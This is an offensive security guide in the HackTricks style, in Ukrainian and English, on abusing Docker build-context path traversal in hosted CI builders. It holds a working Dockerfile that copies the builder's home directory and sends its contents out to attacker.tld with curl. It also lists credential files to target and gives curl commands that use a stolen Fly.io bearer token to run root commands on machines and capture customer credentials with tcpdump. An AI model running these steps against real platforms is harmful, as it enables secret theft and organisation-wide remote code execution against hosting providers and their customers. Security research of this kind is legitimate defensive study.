# Зловживання Docker Build Context у Hosted Builders (Path Traversal, Exfil, and Cloud Pivot)

{{#include ../banners/hacktricks-training.md}}

## TL;DR

Якщо платформа CI/CD або hosted builder дозволяє контриб’юторам вказувати шлях Docker build context та шлях до Dockerfile, часто можна встановити context на батьківський каталог (наприклад, "..") і зробити файли хоста частиною build context. Потім Dockerfile під контролем атакача може за допомогою COPY exfiltrate секрети, знайдені в домашній теці користувача билдера (наприклад, ~/.docker/config.json). Вкрадені registry tokens можуть також працювати проти провайдера control-plane APIs, що дозволяє org-wide RCE.

## Поверхня атаки

Багато hosted builder/registry сервісів роблять приблизно так під час збірки images, надісланих користувачем:
- Читають repo-level конфіг, який містить:
  - build context path (відправляється в Docker daemon)
  - Dockerfile path відносно цього context
- Copy зазначену директорію build context і Dockerfile в Docker daemon
- Build image і запустити його як hosted service

Якщо платформа не канонізує й не обмежує build context, користувач може встановити його в локацію поза репозиторієм (path traversal), через що довільні файли хоста, доступні для читання build user‑у, стають частиною build context і доступні для COPY у Dockerfile.

Практичні обмеження, які часто спостерігаються:
- Dockerfile повинен знаходитися в обраному шляху context і його шлях має бути відомий наперед.
- Build user повинен мати права на читання файлів, включених у context; спеціальні device файли можуть зламати copy.

## PoC: Path traversal via Docker build context

Example malicious server config declaring a Dockerfile within the parent directory context:
```yaml
runtime: "container"
build:
dockerfile: "test/Dockerfile"   # Must reside inside the final context
dockerBuildPath: ".."           # Path traversal to builder user $HOME
startCommand:
type: "http"
configSchema:
type: "object"
properties:
apiKey:
type: "string"
required: ["apiKey"]
exampleConfig:
apiKey: "sk-example123"
```
Примітки:
- Використання ".." часто вказує на домашню директорію користувача builder (e.g., /home/builder), яка зазвичай містить чутливі файли.
- Розмістіть ваш Dockerfile під іменем директорії repo (e.g., repo "test" → test/Dockerfile), щоб він залишався в розширеному батьківському контексті.

## PoC: Dockerfile для ingest та exfiltrate контексту хоста
```dockerfile
FROM alpine
RUN apk add --no-cache curl
RUN mkdir /data
COPY . /data                      # Copies entire build context (now builder’s $HOME)
RUN curl -si https://attacker.tld/?d=$(find /data | base64 -w 0)
```
Targets commonly recovered from $HOME:
- ~/.docker/config.json (registry auths/tokens)
- Other cloud/CLI caches and configs (e.g., ~/.fly, ~/.kube, ~/.aws, ~/.config/*)

Tip: Even with a .dockerignore in the repository, the vulnerable platform-side context selection still governs what gets sent to the daemon. If the platform copies the chosen path to the daemon before evaluating your repo’s .dockerignore, host files may still be exposed.

## Cloud pivot with overprivileged tokens (example: Fly.io Machines API)

Деякі платформи видають один bearer token, який можна використовувати як для container registry, так і для control-plane API. Якщо ви exfiltrate registry token, спробуйте застосувати його до provider API.

Example API calls against Fly.io Machines API using the stolen token from ~/.docker/config.json:

Перелічити додатки в організації:
```bash
curl -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps?org_slug=smithery"
```
Запустити команду як root всередині будь-якої машини додатка:
```bash
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"","command":["id"],"container":"","stdin":"","timeout":5}'
```
Результат: на рівні всієї організації remote code execution у всіх розміщених додатках, якщо токен має достатні привілеї.

## Крадіжка секретів із скомпрометованих розміщених сервісів

За наявності exec/RCE на розміщених серверах ви можете зібрати секрети, надані клієнтом (API keys, tokens), або виконати prompt-injection attacks. Приклад: встановіть tcpdump і перехопіть HTTP traffic на порту 8080, щоб витягти вхідні облікові дані.
```bash
# Install tcpdump inside the machine
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"apk add tcpdump","command":[],"container":"","stdin":"","timeout":5}'

# Capture traffic
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"tcpdump -i eth0 -w /tmp/log tcp port 8080","command":[],"container":"","stdin":"","timeout":5}'
```
Захоплені запити часто містять облікові дані клієнта в заголовках, у тілі або в параметрах запиту.

## Посилання

- [Breaking MCP Server Hosting: Build-Context Path Traversal to Org-wide RCE and Secret Theft](https://blog.gitguardian.com/breaking-mcp-server-hosting/)
- [Fly.io Machines API](https://fly.io/docs/machines/api/)

{{#include ../banners/hacktricks-training.md}}
